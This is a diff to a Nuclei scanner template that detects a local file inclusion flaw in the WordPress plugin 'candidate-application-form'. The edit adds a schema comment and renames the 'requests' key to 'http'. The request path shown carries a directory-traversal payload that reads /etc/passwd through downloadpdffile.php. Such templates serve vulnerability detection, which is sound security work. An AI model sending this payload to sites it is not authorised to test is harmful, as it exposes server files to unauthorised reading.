@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: candidate-application-lfi
 
 info:
@@ -8,7 +9,7 @@ info:
   reference: https://wpscan.com/vulnerability/446233e9-33b3-4024-9b7d-63f9bb1dafe0
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd'
